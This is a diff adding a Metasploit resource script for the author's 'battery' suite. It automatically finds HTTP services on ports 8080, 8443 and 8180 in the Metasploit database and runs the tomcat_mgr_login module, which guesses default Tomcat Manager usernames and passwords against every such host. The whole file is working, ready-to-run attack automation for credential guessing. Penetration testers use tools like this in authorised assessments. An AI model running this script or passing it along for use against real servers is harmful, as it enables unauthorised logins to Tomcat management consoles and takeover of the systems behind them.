@@ -1,0 +1,72 @@
+<ruby>
+=begin
+  Name:  battery/tomcat_mgr_login.rc
+    This script is intended to be used with the Metasploit Framework as a part of the battery suite of resource scripts
+    For more information see:
+      Battery Resource Scripts: https://github.com/kn0/battery
+      Metasploit Framework:  https://github.com/rapid7/metasploit-framework
+
+  Author: kn0
+    twitter: @TrentonIvey
+    email: "Trenton.Ivey@example.com".gsub(/example/,'gmail')
+    web: kn0.ninja
+
+  Description:
+    This Metasploit RC-File attempts to authenticate to discovered Tomcat Manager instances with
+    Metasploit's default tomcat manager password lists
+    It does so by using auxiliary/scanner/http/tomcat_mgr_login against targets.
+    Targets are chosen by finding HTTP services on ports 8080/tcp and 8443/tcp
+=end
+# Print Header
+print_status "Using auxiliary/scanner/http/tomcat_mgr_login"
+  
+# Get a list of target services
+targets = []
+begin
+  framework.db.services.each do |service|
+    if ( (service.name =~ /http/i and ([8080,8180,8443].include? service.port)) and service.state.eql? 'open' and service.proto.eql? 'tcp')
+      targets << {'ip' => service.host.address, 'port' => service.port}
+    end
+  end
+  # Remove any duplicate entries
+  targets.uniq!
+rescue ActiveRecord::ConnectionNotEstablished
+  puts "DB not connected..."
+  return
+end
+
+if targets.empty?
+  print_warning "No targets found"
+else
+  # Setup the module
+  self.run_single("use auxiliary/scanner/http/tomcat_mgr_login")
+  self.run_single("set ShowProgress false")
+  self.run_single("set VERBOSE true")
+  
+  # Run the module for 8443/tcp
+  target_rhosts = ((targets.select {|t| t['port'].eql? 8443}).map {|t| t['ip'] }).join (" ")
+  unless target_rhosts.empty?
+    self.run_single("set RPORT 8443")
+    self.run_single("set SSL true")
+    self.run_single("set RHOSTS '#{target_rhosts}'")
+    self.run_single("run")
+  end
+
+  # Run the module for 8080/tcp
+  target_rhosts = ((targets.select {|t| t['port'].eql? 8080}).map {|t| t['ip'] }).join (" ")
+  unless target_rhosts.empty?
+    self.run_single("set SSL false")
+    self.run_single("set RPORT 8080")
+    self.run_single("set RHOSTS '#{target_rhosts}'")
+    self.run_single("run")
+  end
+
+  # Run the module for 8180/tcp
+  target_rhosts = ((targets.select {|t| t['port'].eql? 8180}).map {|t| t['ip'] }).join (" ")
+  unless target_rhosts.empty?
+    self.run_single("set RPORT 8180")
+    self.run_single("set RHOSTS '#{target_rhosts}'")
+    self.run_single("run")
+  end
+end
+</ruby>
